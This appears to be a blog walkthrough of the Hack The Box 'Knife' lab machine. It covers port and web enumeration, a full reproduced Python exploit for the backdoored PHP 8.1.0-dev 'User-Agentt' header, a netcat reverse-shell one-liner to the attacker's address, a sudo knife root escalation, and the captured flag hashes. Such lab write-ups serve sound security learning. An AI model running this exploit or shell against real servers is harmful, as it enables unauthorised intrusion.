---
title: "Hack The Box - Knife"
date: "2021-08-18"
categories: 
  - "hack-the-box"
tags: 
  - "htb"
coverImage: "lame.png"
---

> A knife is as good as the one who wields it
> 
> Patrick Ness

## Enumeration

As with any machine, the first step is to scan for open ports see the versions of the services running on them:

~/Documents/htb/knife » nmap 10.10.10.242                                                       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 14:21 EDT
Nmap scan report for 10.10.10.242
Host is up (0.055s latency).
Not shown: 981 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
563/tcp   filtered snews
705/tcp   filtered agentx
711/tcp   filtered cisco-tdp
1077/tcp  filtered imgames
1110/tcp  filtered nfsd-status
1164/tcp  filtered qsm-proxy
1309/tcp  filtered jtag-server
2119/tcp  filtered gsigatekeeper
5560/tcp  filtered isqlplus
6003/tcp  filtered X11:3
7402/tcp  filtered rtps-dd-mt
9099/tcp  filtered unknown
9500/tcp  filtered ismserver
10000/tcp filtered snet-sensor-mgmt
16993/tcp filtered amt-soap-https
32781/tcp filtered unknown
51103/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 14.06 seconds
-----------------------------------------------------------------------
~/Documents/htb/knife » nmap -A -p22,80 10.10.10.242                                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 14:18 EDT                                             
Nmap scan report for 10.10.10.242                                                                           
Host is up (0.26s latency).                                                                                 
                                                                                                            
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|\_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds

Generally we would want to scan the other filtered ports, but as this write-up is being done on my second run through I know that isn't the way to go on this box. Now that we know that SSH (TCP/22) and HTTP (TCP/80) are running and their versions, we can focus on these two services. HTTP is definitely the more likely path of the two, so we can start enumerating more on that. First off, I like to look for directories that may be interesting:

┌──(connor㉿kali)-\[~/Documents/htb/knife\]
└─$ gobuster dir -u http://10.10.10.242 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
\[+\] Url:                     http://10.10.10.242
\[+\] Method:                  GET
\[+\] Threads:                 10
\[+\] Wordlist:                /usr/share/wordlists/dirb/big.txt
\[+\] Negative Status codes:   404
\[+\] User Agent:              gobuster/3.1.0
\[+\] Timeout:                 10s
===============================================================
2021/07/20 10:05:56 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) \[Size: 277\]
/.htpasswd            (Status: 403) \[Size: 277\]
/server-status        (Status: 403) \[Size: 277\]
                                               
===============================================================
2021/07/20 10:06:37 Finished
===============================================================

Unfortunately, none of the found directories are super helpful, and we don't have access to them anyways. The next step I always run is nikto:

~/Documents/htb/knife » nikto -h 10.10.10.242                                                   connor@kali
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    10.10.10.242
+ Target Port:        80
+ Start Time:         2021-08-18 14:40:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.

+ 7863 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-08-18 14:53:43 (GMT-4) (785 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~/Documents/htb/knife » 

From here, I had originally done some more enumeration and then looked into SSH as I was stuck. After getting a quick hint from the HTB forums, I realized that all the information needed for the initial foothold had been found.

## Vulnerability

From the nikto scan, we found that this webserver was running a dev version of PHP, which is PHP/8.1.0-dev. After doing some googling, this PHP version has a remote code execution exploit publicly available in [Exploit-DB](https://www.exploit-db.com/exploits/49933) in this python file:

\# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                        
# Date: 23 may 2021                                                                                         
# Exploit Author: flast101                                                                                  
# Vendor Homepage: https://www.php.net/                                                                     
# Software Link:                                                                                            
#     - https://hub.docker.com/r/phpdaily/php                                                               
#    - https://github.com/phpdaily/php                                                                      
# Version: 8.1.0-dev                                                                                        
# Tested on: Ubuntu 20.04                                                                                   
# References:                                                                                               
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a                       
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md                         
                                                                                                            
"""                                                                                                         
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/                                                
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor\_php\_8.1.0-dev.py        
Contact: flast101.sec@gmail.com                                                                             
                                                                                                            
An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the 
backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response \[200\]>':
    print("\\nInteractive shell is opened on", host, "\\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow\_redirects = False)
            current\_page = response.text
            stdout = current\_page.split('<!DOCTYPE html>',1)
            text = print(stdout\[0\])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\\r")
    print(response)
    print("Host is not available, aborting...")
    exit

We're now all set to exploit.

## Exploitation

~/Documents/htb/knife » python3 phpDev.py                                                   1 ↵ connor@kali
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$

After running the exploit, we spawn a web shell. This is a very good start, but before we do anything we want to upgrade it to a full reverse shell. This is a multi-step process.

1. Set up a nc listener:

~/Documents/htb/knife » nc -lvp 4321                                                        1 ↵ connor@kali                
listening on \[any\] 4321 ...

2\. Run a reverse shell from the target host:

~/Documents/htb/knife » python3 phpDev.py                                                       connor@kali
Enter the full host url:
http://10.10.10.242

Interactive shell is opened on http://10.10.10.242 
Can't acces tty; job crontol turned off.
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4321 > /tmp/f

3\. Go back to the nc listener. If everything was done right, you'll have a reverse shell:

~/Documents/htb/knife » nc -lvp 4321                                                        1 ↵ connor@kali                
listening on \[any\] 4321 ...                                                                                                
10.10.10.242: inverse host lookup failed: Unknown host                                                                     
connect to \[10.10.14.41\] from (UNKNOWN) \[10.10.10.242\] 51784                                                               
/bin/sh: 0: can't access tty; job control turned off                                                                       
$ id  
uid=1000(james) gid=1000(james) groups=1000(james)
$ pwd
/
$ cd ~
$ pwd
/home/james
$ ls
config.rb
new.py
user.txt
$ cat user.txt
968595a8c9cabc248d0c10b806e552dd
$ 

Next we need to elevate to root. For this box, it can be found with one of the first methods of privilege escalation you should check for:

$ sudo -l
Matching Defaults entries for james on knife:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
$

When you see you can run commands as root, which is what `sudo -l` tells you, the first stop to check is GTFObins, and when we search it for knife we find this link which tells us how to elevate: [https://gtfobins.github.io/gtfobins/knife/#sudo](https://gtfobins.github.io/gtfobins/knife/#sudo)

$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
id
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/home/james# id
uid=0(root) gid=0(root) groups=0(root)
root@knife:/home/james# cd /root
cd /root
root@knife:~# ls
ls
delete.sh
root.txt
snap
root@knife:~# cat root.txt
cat root.txt
1695506cb19da77cd678a444ca59fe8f
root@knife:~# 

And with that, knife has been rooted. It is a relatively easy machine, but if you miss that PHP version like I did, you will have some issues and it may take a bit longer. If you're ever stuck for a long while and think you have enumerated all you can, it doesn't hurt to check the HTB forums. Any spoilers on the box are removed, and people are good about giving hints that push you in the right direction without just telling you what to look for.
